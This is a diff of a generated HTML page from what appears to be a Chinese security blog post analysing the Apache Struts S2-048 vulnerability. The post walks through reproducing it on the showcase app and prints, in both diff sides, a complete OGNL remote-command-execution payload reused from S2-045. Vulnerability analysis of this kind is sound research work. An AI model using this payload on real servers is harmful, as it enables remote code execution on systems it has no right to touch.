@@ -6,10 +6,10 @@
 
 
 <html class="theme-next muse use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <script>
     (function(){
         if(''){
@@ -28,8 +28,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
 
 
 
@@ -47,7 +47,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
 
 
 
@@ -81,23 +81,23 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
-
-
-  <meta name="keywords" content="M0rk,blog,security,hack,Hexo" />
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
 
 
-
-
-
-  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml" />
+  <meta name="keywords" content="M0rk,blog,security,hack,Hexo">
 
 
 
 
-  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
+
+  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1">
 
 
 
@@ -105,12 +105,12 @@
 
 
 <meta name="description" content="0x01 前言&amp;nbsp;&amp;nbsp;  昨天下午下班前看到朋友圈有人已经在转发s2-048的漏洞通告，见链接 https://cwiki.apache.org/confluence/display/WW/S2-048,晚上的时候简单的复现了一下，今天没事儿就跟了一下。 0x02 从官方通告到poc&amp;nbsp;&amp;nbsp; 从官方通告到概念性证明这是一个考验能力的地方，但是万事都有技巧和经验。官方">
-<meta name="keywords">
 <meta property="og:type" content="article">
 <meta property="og:title" content="s2-048漏洞分析">
 <meta property="og:url" content="http://kevien.github.io/2017/07/08/s2-048漏洞分析/index.html">
-<meta property="og:site_name" content="M0rk's Blog">
+<meta property="og:site_name" content="M0rk&#39;s Blog">
 <meta property="og:description" content="0x01 前言&amp;nbsp;&amp;nbsp;  昨天下午下班前看到朋友圈有人已经在转发s2-048的漏洞通告，见链接 https://cwiki.apache.org/confluence/display/WW/S2-048,晚上的时候简单的复现了一下，今天没事儿就跟了一下。 0x02 从官方通告到poc&amp;nbsp;&amp;nbsp; 从官方通告到概念性证明这是一个考验能力的地方，但是万事都有技巧和经验。官方">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://kevien.github.io/2017/07/08/s2-048漏洞分析/1.png">
 <meta property="og:image" content="http://kevien.github.io/2017/07/08/s2-048漏洞分析/2.png">
 <meta property="og:image" content="http://kevien.github.io/2017/07/08/s2-048漏洞分析/3.png">
@@ -150,7 +150,7 @@
 
 
 
-  <link rel="canonical" href="http://kevien.github.io/2017/07/08/s2-048漏洞分析/"/>
+  <link rel="canonical" href="http://kevien.github.io/2017/07/08/s2-048漏洞分析/">
 
 
 
@@ -159,7 +159,7 @@
   <title>s2-048漏洞分析 | M0rk's Blog</title>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
 
@@ -184,13 +184,13 @@
   <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-wrapper">
   <div class="site-meta ">
     
 
     <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
+      <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">M0rk's Blog</span>
         <span class="logo-line-after"><i></i></span>
@@ -220,7 +220,7 @@
         <li class="menu-item menu-item-home">
           <a href="/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             首页
           </a>
@@ -230,7 +230,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
             
             归档
           </a>
@@ -240,7 +240,7 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
             
             标签
           </a>
@@ -250,7 +250,7 @@
         <li class="menu-item menu-item-about">
           <a href="/about" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
             
             关于
           </a>
@@ -260,7 +260,7 @@
         <li class="menu-item menu-item-sitemap">
           <a href="/sitemap.xml" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
             
             站点地图
           </a>
@@ -273,7 +273,7 @@
             <a href="javascript:;" class="popup-trigger">
           
             
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
             
             搜索
           </a>
@@ -294,9 +294,7 @@
       <i class="fa fa-times-circle"></i>
     </span>
     <div class="local-search-input-wrapper">
-      <input autocapitalize="off" autocomplete="off" autocorrect="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
     </div>
   </div>
   <div id="local-search-result"></div>
@@ -328,16 +326,16 @@
   
   
 
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/07/08/s2-048漏洞分析/">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="M0rk">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="/uploads/avatar.jpg">
     </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="M0rk's Blog">
     </span>
 
@@ -376,7 +374,7 @@
           </span>
 
           
-            <span class="post-category" >
+            <span class="post-category">
             
               <span class="post-meta-divider">|</span>
             
@@ -387,7 +385,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                   <a href="/categories/漏洞分析/" itemprop="url" rel="index">
                     <span itemprop="name">漏洞分析</span>
                   </a>
@@ -453,14 +451,14 @@
       
 
       
-        <h4 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h4><p>&nbsp;&nbsp;  昨天下午下班前看到朋友圈有人已经在转发s2-048的漏洞通告，见链接 <a href="https://cwiki.apache.org/confluence/display/WW/S2-048" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-048</a>,晚上的时候简单的复现了一下，今天没事儿就跟了一下。</p>
+        <h4 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h4><p>&nbsp;&nbsp;  昨天下午下班前看到朋友圈有人已经在转发s2-048的漏洞通告，见链接 <a href="https://cwiki.apache.org/confluence/display/WW/S2-048" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-048</a>,晚上的时候简单的复现了一下，今天没事儿就跟了一下。</p>
 <h4 id="0x02-从官方通告到poc"><a href="#0x02-从官方通告到poc" class="headerlink" title="0x02 从官方通告到poc"></a>0x02 从官方通告到poc</h4><p>&nbsp;&nbsp; 从官方通告到概念性证明这是一个考验能力的地方，但是万事都有技巧和经验。官方通告往往信息量是最大的，首先，通过官方通告如下图所示可以得到至少五个重要的信息点<br><img src="/2017/07/08/s2-048漏洞分析/1.png" alt=""></p>
 <ul>
 <li>1.这是一个远程命令执行漏洞</li>
 <li>2.这个漏洞存在showcase示例应用中，这个很重要，能让我们最快的时间去找到相应的漏洞环境</li>
 <li>3.这个漏洞struts1的插件有关</li>
 <li>4.这个漏洞影响的版本是struts 2.3x系列</li>
-<li>5.漏洞的解决方法，这里是代码的正确写法，此处是找到漏洞触发点的关键<br>1.首先，我们从官网<a href="http://struts.apache.org/download.cgi#struts25101" target="_blank" rel="external">http://struts.apache.org/download.cgi#struts25101</a>下载对应的struts以及showcase。<br>2.将war包部署到应用服务器，我这里用了tomcat，打开struts-showcase如下图所示：<br><img src="/2017/07/08/s2-048漏洞分析/2.png" alt=""><br>3.查找关键性代码<br><img src="/2017/07/08/s2-048漏洞分析/3.png" alt=""><br>可以看到箭头所指的地方就使用到了官方不’提倡’使用的规范，应该就是这个地方了。<br>打开这个页面可以看到这里有三个输入的地方，这里应该就是恶意代码插入的地方。<br><img src="/2017/07/08/s2-048漏洞分析/4.png" alt=""><br>4.代码调试<br>这个时候就该上eclipse了，跟踪一下数据流向。我们先在此处加个断点<br><img src="/2017/07/08/s2-048漏洞分析/5.png" alt=""><br>通过调试会发现M0rk参数会进入buildMessageFormat()这个函数里面<br><img src="/2017/07/08/s2-048漏洞分析/6.png" alt=""><br>很熟悉有木有，这个就是s2-045漏洞(详见之前的文章<a href="http://www.cnblogs.com/mrchang/p/6515150.html" target="_blank" rel="external">http://www.cnblogs.com/mrchang/p/6515150.html</a>)里面的利用点，直接利用不就行了嘛。直接将name参数修改为s2-045的payload就行了.<br>payload如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;(#szgx=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos; open /Applications/Calculator.app&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())&#125;</div></pre></td></tr></table></figure>
+<li>5.漏洞的解决方法，这里是代码的正确写法，此处是找到漏洞触发点的关键<br>1.首先，我们从官网<a href="http://struts.apache.org/download.cgi#struts25101" target="_blank" rel="noopener">http://struts.apache.org/download.cgi#struts25101</a>下载对应的struts以及showcase。<br>2.将war包部署到应用服务器，我这里用了tomcat，打开struts-showcase如下图所示：<br><img src="/2017/07/08/s2-048漏洞分析/2.png" alt=""><br>3.查找关键性代码<br><img src="/2017/07/08/s2-048漏洞分析/3.png" alt=""><br>可以看到箭头所指的地方就使用到了官方不’提倡’使用的规范，应该就是这个地方了。<br>打开这个页面可以看到这里有三个输入的地方，这里应该就是恶意代码插入的地方。<br><img src="/2017/07/08/s2-048漏洞分析/4.png" alt=""><br>4.代码调试<br>这个时候就该上eclipse了，跟踪一下数据流向。我们先在此处加个断点<br><img src="/2017/07/08/s2-048漏洞分析/5.png" alt=""><br>通过调试会发现M0rk参数会进入buildMessageFormat()这个函数里面<br><img src="/2017/07/08/s2-048漏洞分析/6.png" alt=""><br>很熟悉有木有，这个就是s2-045漏洞(详见之前的文章<a href="http://www.cnblogs.com/mrchang/p/6515150.html" target="_blank" rel="noopener">http://www.cnblogs.com/mrchang/p/6515150.html</a>)里面的利用点，直接利用不就行了嘛。直接将name参数修改为s2-045的payload就行了.<br>payload如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#szgx=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos; open /Applications/Calculator.app&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())&#125;</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <p><img src="/2017/07/08/s2-048漏洞分析/7.png" alt=""></p>
@@ -501,8 +499,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/07/16/windows DLL注入/" rel="next" title="DLL注入">
-                <i class="fa fa-chevron-left"></i> DLL注入
+              <a href="/2017/06/25/ssh蜜罐搭建/" rel="next" title="ssh蜜罐搭建">
+                <i class="fa fa-chevron-left"></i> ssh蜜罐搭建
               </a>
             
           </div>
@@ -511,8 +509,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/06/25/ssh蜜罐搭建/" rel="prev" title="ssh蜜罐搭建">
-                ssh蜜罐搭建 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/07/16/windows DLL注入/" rel="prev" title="DLL注入">
+                DLL注入 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -561,7 +559,7 @@
 
       
         <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
             文章目录
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview">
@@ -571,10 +569,8 @@
       
 
       <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="/uploads/avatar.jpg"
-               alt="M0rk" />
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="M0rk">
           <p class="site-author-name" itemprop="name">M0rk</p>
            
               <p class="site-description motion-element" itemprop="description"></p>
@@ -701,7 +697,7 @@
         <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
 
-<div class="copyright" >
+<div class="copyright">
   
   &copy; 
   <span itemprop="copyrightYear">2020</span>
